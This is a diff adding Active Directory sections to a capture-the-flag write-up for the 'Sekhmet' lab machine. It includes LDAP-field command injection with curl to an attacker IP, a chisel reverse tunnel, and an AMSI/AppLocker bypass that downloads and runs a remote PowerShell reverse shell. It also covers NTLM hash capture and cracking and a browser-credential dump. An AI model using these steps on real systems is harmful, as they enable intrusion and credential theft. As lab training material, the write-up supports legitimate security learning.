@@ -1,3 +1,7 @@
+---
+description: Took me a few weeks...really long and really convuluted.
+---
+
 # Sekhmet (AD)
 
 ## Gaining Access
@@ -187,6 +191,203 @@ With these commands, we can become root on this container and capture the user f
 
 Rest of this is WIP! Really long machine.
 
-## Privilege Escalation
+## Active Directory
 
 ### Domain Enum
+
+Earlier, we found another IP address at 192.168.0.2. I wanted to enumerate the ports that are open on that machine. We can first see what ports are open with this one liner:
+
+```
+for p in {1..65535}; do nc -vn 192.168.0.2 $p -w 1 -z & done 2> output.txt
+```
+
+From here, we can see some ports that are open.
+
+<figure><img src="../../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>
+
+This pretty much confirms that the actual DC is at 192.168.0.2. We would need to use chisel and proxychains to direct traffic there for further enumeration.&#x20;
+
+```bash
+# on Kali
+./chisel server --port 8888 --reverse
+
+# on host
+./chisel client --max-retry-count=1 10.10.14.29:8888 R:1080:socks
+```
+
+Afterwards, we can reach the DC just fine.
+
+<figure><img src="../../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>
+
+Now we can start with some proper enumeration of the domain. The first thing I noted was that port 53 for DNS was open within the output. We can use dig top find out&#x20;
+
+### Silver Ticket and SMB Shares
+
+With the credentials for ray.duncan, we can actually request a ticket for him. This can be done using `getST.py`.&#x20;
+
+<figure><img src="../../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
+
+WIth this ticket, we can check out the shares within the domain, since SMB was open on the host.
+
+<figure><img src="../../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
+
+WC-Share was something new.&#x20;
+
+<figure><img src="../../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>
+
+Within this .txt file, we find an interesting output.
+
+<figure><img src="../../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>
+
+I wasn't sure what to do with this, but we can keep it for now I guess.
+
+### LDAP Enum + RCE
+
+SMB revealed nothing of interest, so I moved onto LDAP enumeration. I dumped information using `ldapsearch`. This was done on the container using the ticket we cached for ray.duncan earlier with `kinit`.
+
+<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>
+
+Analysing the information, we notice that the numbers and users and numbers we found earlier on the shares are present in the `mobile` field for users.
+
+<figure><img src="../../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>
+
+I was wondering what this parameter was used for, and why was it hinted at. The first thing that comes to mind is testing for RCE or other injection payloads. To modify LDAP entries, we would need to use `ldapmodify`. This also involves the creation of LDIF files.
+
+{% embed url="https://www.digitalocean.com/community/tutorials/how-to-use-ldif-files-to-make-changes-to-an-openldap-system" %}
+
+I created this LDIF file first to test. Then I updated the entry and was surprised to get a hit back!
+
+```
+dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
+changetype: modify
+replace: mobile
+mobile: 1;curl http://10.10.14.29/rcecfmed
+```
+
+<figure><img src="../../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
+
+This confirms we have RCE. Now, we can attempt to gain a reverse shell on the machine. I tried downloading nc.exe on the machine, and noticed that there was a character limit on the mobile entry. Anyways, downloading the file to `C:\Windows\Tasks\` works, but it does not seem to execute to give me my shell.&#x20;
+
+### AMSI + AppLocker Bypass
+
+Perhaps some kind of Windows Security was running on the machine and not allowing it. I tried a few directories, such as AppLocker. And if there's AppLocker, there could be AMSI as well, meaning we cannot just use nc.exe but we have to create a new executable to do so.
+
+Also, because we have a character limit, we would likely need to create a .exe file for the reverse shell. So I booted up a Windows VM and started searching for possible payloads.
+
+This repo from MinatoTW was very helpful:
+
+{% embed url="https://github.com/MinatoTW/CLMBypassBlogpost" %}
+
+Within the code, I changed the command executed to download Invoke-PowerShellTcp from our machine.
+
+```csharp
+ String exec = "iex(new-object net.webclient).downloadstring('http://10.10.14.29/payload')";  // Modify for custom commands
+```
+
+Then, we can compile it using `csc.exe` within our Windows machine.
+
+```powershell
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:System.Management.Automation.dll Program.cs
+```
+
+Take note that the `System.Management.Automation.dll` is within the repo but I moved it up a few directories. Then, once compiled we can transfer it back to our machine.
+
+We can change the commands executed within the `program.cs` file to what we want, then we can compile this thing and put it within a directory. I changed directories to `C:\Windows\Debug\wia` , then updated the LDAP entry to download and execute the shell.
+
+Eventually, you'll get a shell.
+
+<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>
+
+The shell is a bit buggy if we leave the LDAP entry that is executing the payload to continue running, so I changed it back to numbers after getting the shell to prevent this from happening.
+
+## Privilege Escalation
+
+### Enum
+
+As this new user, I enumerated around a bit. Found another user on the host named Bob.Wood.
+
+<figure><img src="../../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>
+
+We also find out the Domain Admins:
+
+<figure><img src="../../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>
+
+Seems that bob.wood is both a user and an admin. Perhaps, he is using the same device to switch between user and administrator accounts. We'll keep this in mind for later.
+
+I ran WinPEAS within the machine in the `C:\Windows\Debug\wia` directory to bypass AppLocker once more.&#x20;
+
+We can check to see that the NTLM settings are insecure:
+
+<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>
+
+NTLMv2 is the legacy protocol that uses the challenge-response method of authenticating users, and **this involves sending the user hash**. This means that the next step is to intercept this response and capture the hash.
+
+### NTLM Leak
+
+For some reason, it wouldn't let me authenticate to my own SMB server from the DC. To circumvent this, we can head to the compromised webserver container and run smbserver there.
+
+First, we can find out the webserver's domain name:
+
+<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>
+
+Then, we can simply use a `smbserver` binary from here.
+
+{% embed url="https://github.com/ropnop/impacket_static_binaries/releases" %}
+
+Here's the output of that:
+
+<pre class="language-bash"><code class="lang-bash"><strong># on webserver container
+</strong>chmod +x smbserver
+./smbserver share . -smb2support
+
+# on DC
+net use \\webserver.windcorp.htb\share
+</code></pre>
+
+<figure><img src="../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
+
+We can then crack this hash using `john`.
+
+<figure><img src="../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>
+
+### Bob.Wood
+
+Now that we have one set of credentials, we can think about how to gain a shell on bob.wood. I tried remote Powershell with the credentials, and found that they were re-used!
+
+<figure><img src="../../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>
+
+With this, we can gain another shell on the host using the same binary that bypassed AppLocker and AMSI.
+
+<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>
+
+### Bob.Woodadm
+
+We already know that Bob.Wood has another account on the domain with administrator privileges. Perhaps the credentials for the administrator are hidden somewhere on this account, perhaps in some file or cache.
+
+I could not run winPEAS for some reason, always crashed my shell. So I manually enumerated the box. I checked for app caches, hidden files, and browser caches. In the `C:\Users\Bob.Wood\AppData\Local\Microsoft\Edge\User Data\Default` file, there was a Login Data file which looked  rather suspicious.
+
+There was mention of the bob.woodADM user here.
+
+<figure><img src="../../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>
+
+I went to search for Github Repos with tools that could decrypt this thing, and eventually found one here:
+
+{% embed url="https://github.com/moonD4rk/HackBrowserData" %}
+
+This tool would help us decrypt the data we need. We can download this to the machine. We can run this thing, and see that it successfully dumps out data from the browser.
+
+<figure><img src="../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>
+
+And we can find the credentials for bob.woodadm.
+
+<figure><img src="../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>
+
+Now, we can attempt some remote Powershell again.
+
+<figure><img src="../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>
+
+Then, we can finally capture this flag and end the box. This took days to finish...
